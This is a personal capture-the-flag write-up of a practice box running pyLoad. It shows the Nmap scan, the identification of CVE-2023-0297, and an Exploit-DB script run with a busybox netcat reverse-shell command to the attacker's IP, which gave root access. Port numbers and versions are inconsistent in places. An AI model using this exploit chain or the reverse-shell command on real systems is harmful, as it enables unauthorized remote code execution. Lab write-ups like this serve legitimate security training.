---
Date: 2024-10-14
Platform: PG-Practice
Category: Linux
Difficulty: Intermediate
Status: Complete
IP: 192.168.165.26
Writeup: https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad
---
# PyLoader
I'm still shocked at how quick and incredibly easy this was - I went from boot to root in <15mins! 

After Nmap showed responses to `22` and `9666` I checked `9666` in Firefox immediately (while the Nmap scan is still running) as I'm prone to doing for anything I don't immediately recognise. As soon as I saw a page with `pyLoad` I just threw "pyload exploit" into Google, found a bunch of RCE exploits for CVE-2023-0297, and pulled up the entry on Exploit-DB. 

I figured I'd go straight for a reverse shell in the command parameter, and after getting a mistaken connection from a poorly formatted python shell, I ran a busybox reverse shell and immediately got root access!

I'm still a little confused why this box is marked "Intermediate" but I've been pretty sick all day so I'll absolutely take the easy win. I didn't bother looking up a walkthrough for this, so the "Writeup" link above is a GitHub entry on how CVE-2023-0297 was found as background instead.
# Resolution summary
- Ran Nmap to identify ports `22` & `8080`
- Visited html (`9666`) & identified `pyLoad`
- Identified exploit for CVE-2023-0297 and ran against target for reverse shell
- Received reverse shell as `root` so upgraded shell and printed `proof.txt`
## Improved skills
- Exploit identification
## Used tools
- Nmap
- python

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN Pyloader.nmap 192.168.165.26 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
9666/tcp open  http    CherryPy wsgiserver
|_http-favicon: Unknown favicon MD5: 71AAC1BA3CF57C009DA1994F94A2CC89
|_http-server-header: Cheroot/8.6.0
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http://192.168.165.26:9666/
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 9888 -  (Apache)
- Navigated to `http://192.168.165.26:9666` and identified `pyLoad`
![[Pasted image 20241014202443.png]]
	- Potentially vulnerable to CVE-2023-0297
- Navigated to `http://http://192.168.165.26:9666/robots.txt`
![[Pasted image 20241014202759.png]]
---
# Exploitation
- Identified potential exploit `51532.py` from [Exploit Database](https://www.exploit-db.com/exploits/51532) - copied exploit to local host, started netcat listener on port `4444` and ran exploit with python reverse shell
```
python3 51532.py -u http://192.168.165.26:9666 -c 'busybox nc 192.168.45.200 4444 -e /bin/sh'
```
- Caught reverse shell as `root`
![[Pasted image 20241014203650.png]]
- Ran `/usr/bin/script -qc /bin/bash /dev/null` to get full shell, then ran `cat /root/proof.txt` to print `b9c8fbfddbc8b37c93422b4d8e14d88e`
---
# Trophy & Loot
`root.txt` = `b9c8fbfddbc8b37c93422b4d8e14d88e`